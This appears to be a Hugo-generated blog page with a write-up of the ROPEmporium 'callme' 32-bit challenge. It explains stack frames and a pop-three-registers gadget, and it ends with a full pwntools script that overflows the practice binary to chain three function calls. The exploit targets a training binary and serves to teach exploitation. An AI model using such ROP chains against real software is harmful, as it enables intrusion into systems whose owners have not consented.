@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.92.2" />
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="" />
+  <meta property="og:url" content="http://example.org/posts/callme32/" />
+  <link rel="canonical" href="http://example.org/posts/callme32/" /><link rel="alternate" type="application/atom+xml" href="http://example.org/index.xml" title="My New Hugo Site">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "http:\/\/example.org\/"
+      },
+      "articleSection" : "posts",
+      "name" : "ROPEmporium: callme 32-bit",
+      "headline" : "ROPEmporium: callme 32-bit",
+      "description" : "Writeup of callme [callme] on ROPEmporium How do you make consecutive calls to a function from your ROP chain that won\u0026rsquo;t crash afterwards? If you keep using the call instructions already present in the binary your chains will eventually fail, especially when exploiting 32 bit binaries. Consider why this might be the case.\nThis is the information we\u0026rsquo;re greeted with in the callme challenge.\nWhat we need to do is call the functions \u0026ldquo;callmeone\u0026rdquo;, \u0026ldquo;callmetwo\u0026rdquo;, \u0026ldquo;callmethree\u0026rdquo; all with the same arguments: 0xdeadbeef, 0xcafebabe, 0xd00df00d.",
+      "inLanguage" : "en-US",
+      "author" : "",
+      "creator" : "",
+      "publisher": "",
+      "accountablePerson" : "",
+      "copyrightHolder" : "",
+      "copyrightYear" : "2021",
+      "datePublished": "2021-05-24 14:57:00 \u002b0200 CEST",
+      "dateModified" : "2021-05-24 14:57:00 \u002b0200 CEST",
+      "url" : "http:\/\/example.org\/posts\/callme32\/",
+      "keywords" : [  ]
+  }
+</script>
+<title>ROPEmporium: callme 32-bit</title>
+  <meta property="og:title" content="ROPEmporium: callme 32-bit" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="Writeup of callme [callme] on ROPEmporium How do you make consecutive calls to a function from your ROP chain that won&amp;rsquo;t crash afterwards? If you keep using the call instructions already present in the binary your chains will eventually fail, especially when exploiting 32 bit binaries. Consider why this might be the case.
+This is the information we&amp;rsquo;re greeted with in the callme challenge.
+What we need to do is call the functions &amp;ldquo;callmeone&amp;rdquo;, &amp;ldquo;callmetwo&amp;rdquo;, &amp;ldquo;callmethree&amp;rdquo; all with the same arguments: 0xdeadbeef, 0xcafebabe, 0xd00df00d." />
+  <meta name="description" content="Writeup of callme [callme] on ROPEmporium How do you make consecutive calls to a function from your ROP chain that won&amp;rsquo;t crash afterwards? If you keep using the call instructions already present in the binary your chains will eventually fail, especially when exploiting 32 bit binaries. Consider why this might be the case.
+This is the information we&amp;rsquo;re greeted with in the callme challenge.
+What we need to do is call the functions &amp;ldquo;callmeone&amp;rdquo;, &amp;ldquo;callmetwo&amp;rdquo;, &amp;ldquo;callmethree&amp;rdquo; all with the same arguments: 0xdeadbeef, 0xcafebabe, 0xd00df00d." />
+  <meta property="og:locale" content="en-us" /><meta property="og:image" content="" />
+  
+
+  
+    <style>body{font-family:bree serif,sans-serif;-webkit-font-smoothing:antialiased;margin:0 20px}article{max-width:800px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none}a:hover{font-weight:600;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:18px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#000}.markdown-body blockquote{margin:0;padding:0 1em;color:#57606a;border-left:.25em solid #d0d7de}.markdown-body pre{padding:16px;overflow:auto;border-radius:10px}.markdown-body code{padding:.2em .4em;font-size:85%;background-color:#f6f8fa;border-radius:6px}.markdown-body pre>code{padding:0;font-size:100%;background-color:inherit;border:0}.Chinese .markdown-body{line-height:200%}.site-date-catalog{font-size:2rem}.header-title{font-size:2rem;font-weight:700;margin-top:32px;font-family:bungee shade,sans-serif}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:600}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="My New Hugo Site">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+  
+  
+</head>
+
+
+<body>
+  <article class="post " id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  <div class="header-title">
+    <a href="/"
+      >cavefx</a
+    >
+  </div>
+  <div class="header-subtitle"></div>
+</header>
+<div class="row end-md center-xs header-items">
+  
+  <div class="header-item">
+    <a href="/about" target="_blank">About Me</a>
+  </div>
+  
+</div>
+<div class="row end-xs">
+   
+</div>
+<div class="header-line"></div>
+
+        </div>
+        <header class="post-header">
+          <h1 class="post-title">ROPEmporium: callme 32-bit</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2021-05-24 14:57:00 CEST">
+                24 May 2021
+              </time>
+              
+            </div>
+            <div class="col-xs-6">
+              
+            </div>
+          </div>
+          
+        </header>
+
+        <div class="post-content markdown-body">
+          
+          <h1 id="writeup-of-callme-callme-on-ropemporium">Writeup of callme [callme] on ROPEmporium</h1>
+<p>How do you make consecutive calls to a function from your ROP chain that won&rsquo;t crash afterwards?
+If you keep using the call instructions already present in the binary your chains will eventually fail, especially when exploiting 32 bit binaries. Consider why this might be the case.</p>
+<p>This is the information we&rsquo;re greeted with in the callme challenge.</p>
+<p>What we need to do is call the functions &ldquo;callmeone&rdquo;, &ldquo;callmetwo&rdquo;, &ldquo;callmethree&rdquo; all with the same arguments: 0xdeadbeef, 0xcafebabe, 0xd00df00d.</p>
+<p>Let&rsquo;s look at the binary with radare2:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#f92672">&gt;</span>  <span style="color:#ae81ff">0x08048570</span>   <span style="color:#ae81ff">50</span> entry0                                   
+   <span style="color:#ae81ff">0x080486ed</span>   <span style="color:#ae81ff">98</span> sym.pwnme
+   <span style="color:#ae81ff">0x080484c0</span>    <span style="color:#ae81ff">6</span> sym.imp.read
+   <span style="color:#ae81ff">0x0804874f</span>   <span style="color:#ae81ff">67</span> sym.usefulFunction
+   <span style="color:#ae81ff">0x080484e0</span>    <span style="color:#ae81ff">6</span> sym.imp.callme_three <span style="color:#f92672">&lt;-</span> Call_three
+   <span style="color:#ae81ff">0x08048550</span>    <span style="color:#ae81ff">6</span> sym.imp.callme_two <span style="color:#f92672">&lt;-</span> Call_two
+   <span style="color:#ae81ff">0x080484f0</span>    <span style="color:#ae81ff">6</span> sym.imp.callme_one <span style="color:#f92672">&lt;-</span> Call_one
+   <span style="color:#ae81ff">0x08048686</span>  <span style="color:#ae81ff">103</span> main
+</code></pre></div><p>Okay! So this should be easy. Let&rsquo;s look at the stack we want.</p>
+<pre tabindex="0"><code>┌────────────┐
+│            │
+│ 0xd00df00d │
+│            │
+├────────────┤
+│            │
+│ 0xcafebabe │
+│            │
+├────────────┤
+│            │
+│ 0xdeadbeef │
+│            │
+├────────────┤
+│            │
+│ callme_one │
+│            │
+└────────────┘
+</code></pre><p>Now how do we continue with the next callme_two? Just the same principle? Is this even right?
+I tried a payload that went something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload<span style="color:#f92672">=</span>padding
+payload<span style="color:#f92672">+=</span>callme_one<span style="color:#f92672">+</span>dead<span style="color:#f92672">+</span>cafe<span style="color:#f92672">+</span>dood
+payload<span style="color:#f92672">+=</span>callme_two<span style="color:#f92672">+</span>dead<span style="color:#f92672">+</span>cafe<span style="color:#f92672">+</span>dood
+payload<span style="color:#f92672">+=</span>callme_three<span style="color:#f92672">+</span>dead<span style="color:#f92672">+</span>cafe<span style="color:#f92672">+</span>dood
+</code></pre></div><p>It&rsquo;s important to note, that when a function call is made a new <strong>stack frame</strong> is created. This is to avoid corrupting data outisde a function, and also to save memory. Let&rsquo;s look at a simple python program that explains this quite well:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">test</span>():
+    a <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    print(a)
+
+test()
+main()
+</code></pre></div><p>This would yield a &ldquo;NameError: name &lsquo;a&rsquo; is not defined&rdquo;. To return from a function, it&rsquo;s important that the function has a return address. The return address is the first thing that will be pushed onto the stack after a function call.</p>
+<p>We simply need some sort of way to return back after our function. It&rsquo;s also important to note, that we push data on to the stack, that shouldn&rsquo;t be there in the first place, this can cause issues when returning, as the program might interpret these in a different way then. We simply make our chain like this:</p>
+<pre tabindex="0"><code>payload = callme_one+pop3+argv1+argv2+argv3
+payload += callme_two+pop3+argv1+argv2+argv3
+payload += callme_three+argv1+argv2+argv3
+</code></pre><p>This firstly puts the pop3 as the return address after the function has been called. So it calls callme_one with the three arguments, then returns to pop3 which places these into registers, and removes them from the stack. Then it calls the next function, with the three arguments and afterwards places these into registers, effectively removing them from the stack. Lastly it calls callme_three and&hellip; flag</p>
+<p>Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+usefulFunction <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4f\x87\x04\x08</span><span style="color:#e6db74">&#34;</span>
+callmeone <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x08048780</span>) <span style="color:#75715e">#b&#34;\x80\x87\x04\x08&#34;</span>
+callme_one_plt <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080484f0</span>)
+callme_two_plt <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x08048550</span>)
+callmethree <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x0804875e</span>)
+
+dbef <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)
+cfbb <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xcafebabe</span>)
+dfd <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xd00df00d</span>)
+
+completeargv<span style="color:#f92672">=</span>dbef<span style="color:#f92672">+</span>cfbb<span style="color:#f92672">+</span>dfd
+
+gdgtpopm <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080487f9</span>) <span style="color:#75715e">#pops three registers</span>
+
+elfPath<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;./callme32&#34;</span>
+context<span style="color:#f92672">.</span>arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;i386&#34;</span>
+
+gdbscript<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">break *0x080484f0
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+
+terminalSetting <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;gnome-terminal&#39;</span>, <span style="color:#e6db74">&#39;-e&#39;</span>]
+context<span style="color:#f92672">.</span>clear(terminal<span style="color:#f92672">=</span>terminalSetting)
+
+
+io <span style="color:#f92672">=</span> pwnlib<span style="color:#f92672">.</span>gdb<span style="color:#f92672">.</span>debug(elfPath, gdbscript <span style="color:#f92672">=</span> gdbscript)
+
+<span style="color:#75715e">#mnm = cyclic_gen()</span>
+<span style="color:#75715e">#mnm = mnm.get(80)</span>
+point<span style="color:#f92672">=</span>cyclic_find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;laaa&#34;</span>, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;little&#34;</span>)
+<span style="color:#75715e">#6161616c is at the return or laaa</span>
+
+
+<span style="color:#75715e">#https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    print(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;&gt; &#34;</span>))
+    payload<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>point
+    payload<span style="color:#f92672">+=</span>callme_one_plt<span style="color:#f92672">+</span>gdgtpopm<span style="color:#f92672">+</span>completeargv
+    payload<span style="color:#f92672">+=</span>callme_two_plt<span style="color:#f92672">+</span>gdgtpopm<span style="color:#f92672">+</span>completeargv  
+    payload<span style="color:#f92672">+=</span>callmethree<span style="color:#f92672">+</span>completeargv  
+
+    io<span style="color:#f92672">.</span>send(payload)
+    io<span style="color:#f92672">.</span>interactive()
+
+main()
+</code></pre></div>
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+        
+
+        <div class="site-footer">
+  
+  
+</div>
+
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
